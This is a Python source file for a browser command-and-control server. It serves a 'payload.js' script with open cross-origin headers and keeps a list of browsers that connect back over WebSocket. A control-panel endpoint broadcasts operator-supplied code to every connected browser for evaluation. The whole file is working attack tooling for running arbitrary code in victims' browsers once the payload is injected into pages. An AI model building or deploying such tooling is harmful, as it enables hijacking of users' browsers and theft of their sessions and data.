import asyncio
import json

import websockets
from aiohttp import web

connected_clients = []

async def hello(websocket, path):
    print(f"New client connected: {websocket.remote_address}")
    connected_clients.append(websocket)
    try:
        async for message in websocket:
            print(f"Received message from client: {message}")
    except:
        pass
    finally:
        print(f"Client disconnected: {websocket.remote_address}")
        connected_clients.remove(websocket)

async def send_command(request):
    data = await request.json()
    command = data.get('command', '')

    if not command:
        return web.Response(text="No command provided", status=400)

    command_data = json.dumps({"type": "eval", "code": command})

    for client in connected_clients:
        await client.send(command_data)

    return web.Response(text="Command sent to all clients")

async def serve_payload(request):
    with open("./static/payload.js", 'r', encoding='UTF-8') as f:
        content = f.read()

    return web.Response(text=content, headers={
        'Access-Control-Allow-Origin': '*',
        'Content-Type': 'application/javascript'
    })

if __name__ == "__main__":
    loop = asyncio.get_event_loop()

    # WebSocket server
    ws_server = websockets.serve(hello, "localhost", 8765)
    loop.run_until_complete(ws_server)

    # HTTP server for control panel
    app = web.Application()
    app.router.add_post('/send_command', send_command)
    app.router.add_get('/payload.js', serve_payload)

    # Serve static HTML for the control panel
    app.router.add_static('/', './static')

    runner = web.AppRunner(app)
    loop.run_until_complete(runner.setup())
    site = web.TCPSite(runner, "localhost", 8080)
    loop.run_until_complete(site.start())

    print("WebSocket server started at ws://localhost:8765/")
    print("Control panel available at http://localhost:8080/control_panel.html")

    loop.run_forever()
    